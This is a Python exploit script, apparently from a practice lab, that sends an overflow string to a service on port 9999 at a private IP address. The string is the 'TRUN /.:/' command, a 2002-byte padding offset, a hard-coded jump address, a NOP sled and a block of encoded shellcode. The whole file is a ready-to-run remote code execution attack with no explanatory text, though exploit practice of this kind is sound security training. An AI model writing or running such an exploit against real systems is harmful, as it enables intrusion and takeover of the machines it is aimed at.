#!/usr/bin/env python3

import socket


ip='10.10.83.199'
port=9999

shellcode =  ""

shellcode += "\xbe\xa2\x6a\xa9\x8a\xda\xcf\xd9\x74\x24\xf4"
shellcode += "\x58\x31\xc9\xb1\x5e\x83\xe8\xfc\x31\x70\x11"
shellcode += "\x03\x70\x11\xe2\x57\x96\x41\x05\x97\x67\x92"
shellcode += "\x7a\xa6\xb5\xf6\xf1\x9a\x09\x7e\xe0\x91\x38"
shellcode += "\x8c\x60\xf7\xa8\xbd\x89\x7c\xa2\x95\x7a\x35"
shellcode += "\x09\xc0\xb5\xf9\x22\x30\xd7\x85\x38\x65\x37"
shellcode += "\xb4\xf2\x78\x36\xf1\x44\xf6\xd7\xaf\x01\x73"
shellcode += "\x75\x5f\x25\xc1\x46\x5e\xe9\x4d\xf6\x18\x8c"
shellcode += "\x92\x83\x94\x8f\xc2\xe7\x7c\xb0\xe3\x24\xf7"
shellcode += "\xf8\xfb\x9a\x82\x30\x8f\x26\xc5\xf3\x8f\xdc"
shellcode += "\xe1\x78\x6e\x35\x38\xbf\xb0\x76\x37\x93\x32"
shellcode += "\x4e\x7f\x0b\x41\xa4\x7c\xb6\x52\x7f\xff\x6c"
shellcode += "\xd6\x60\xa7\xe7\x40\x45\x56\x2b\x16\x0e\x54"
shellcode += "\x80\x5c\x48\x78\x17\xb0\xe2\x84\x9c\x37\x25"
shellcode += "\x0d\xe6\x13\xe1\x56\xbc\x3a\xb0\x32\x13\x42"
shellcode += "\xa2\x9a\xcc\xe6\xa8\x08\x1a\x96\x50\xd3\x23"
shellcode += "\xca\xc6\x18\xee\xf5\x16\x36\x79\x85\x24\x99"
shellcode += "\xd1\x01\x05\x52\xfc\xd6\x1c\x74\xff\x09\xa6"
shellcode += "\x14\x01\xaa\xd7\x3d\xc6\xfe\x87\x55\xef\x7e"
shellcode += "\x4c\xa5\x10\xab\xf9\xaf\x86\x5e\xf8\xbc\x5a"
shellcode += "\x37\x06\xc2\x41\xf6\x8f\x24\xd5\xa8\xdf\xf8"
shellcode += "\x96\x18\xa0\xa8\x7e\x73\x2f\x97\x9f\x7c\xe5"
shellcode += "\xb0\x0a\x93\x50\xe9\xa2\x0a\xf9\x61\x52\xd2"
shellcode += "\xd7\x0c\x54\x58\xd2\xf1\x1b\xa9\x97\xe1\x4c"
shellcode += "\xce\x57\xf9\x8c\x7b\x58\x93\x88\x2d\x0f\x0b"
shellcode += "\x93\x08\x67\x94\x6c\x7f\xfb\xd2\x93\xfe\xca"
shellcode += "\xa9\xa2\x94\x72\xc5\xca\x78\x73\x15\x9d\x12"
shellcode += "\x73\x7d\x79\x47\x20\x98\x86\x52\x54\x31\x13"
shellcode += "\x5d\x0d\xe6\xb4\x35\xb3\xd1\xf3\x99\x4c\x34"
shellcode += "\x80\xde\xb3\xcb\xaf\x46\xdc\x33\xf0\x76\x1c"
shellcode += "\x59\xf0\x26\x74\x96\xdf\xc9\xb4\x57\xca\x81"
shellcode += "\xdc\xd2\x9b\x60\x7c\xe3\xb1\x25\x20\xe4\x36"
shellcode += "\xfe\xd3\x9f\x37\x01\x14\x60\x5e\x66\x14\x61"
shellcode += "\x5e\x98\x28\xb4\x67\xee\x6f\x05\xdc\xf1\x6d"
shellcode += "\xa3\x29\x9a\x2b\x26\x90\xc7\xcb\x9d\xd7\xf1"
shellcode += "\x4f\x17\xa8\x05\x4f\x52\xad\x42\xd7\x8f\xdf"
shellcode += "\xdb\xb2\xaf\x4c\xdb\x96"

Command = "TRUN /.:/ "
Offset = 2002*"A"
jmp = "\xAF\x11\x50\x62"
# 625011AF
nops = 16*"\x90"

string = Command + Offset + jmp + nops + shellcode


try:
	with socket.socket() as s:
		s.connect((ip,port))
		print("sending  exploit")
		s.send(bytes(string,'latin-1'))
	
except:
	print("failed to connect")